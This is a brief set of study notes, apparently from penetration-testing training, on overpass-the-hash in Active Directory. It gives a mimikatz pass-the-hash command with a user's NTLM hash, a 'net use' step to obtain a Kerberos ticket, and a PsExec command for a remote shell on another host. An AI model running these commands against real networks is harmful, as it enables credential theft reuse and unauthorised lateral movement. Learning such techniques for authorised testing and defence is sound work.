#activedirectory #pth 

To get TGT from AD

🔴 To Run as another user - right click  +Shift

1. Get the NTLM hash of user Jen

```mimikatz
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

2. Do an interactive login after
```powershell
net use \\files04
```
3. Now you can use this process to authenticate with any service that only uses Kerberos

```powershell
.\PsExec.exe \\files04 cmd
```
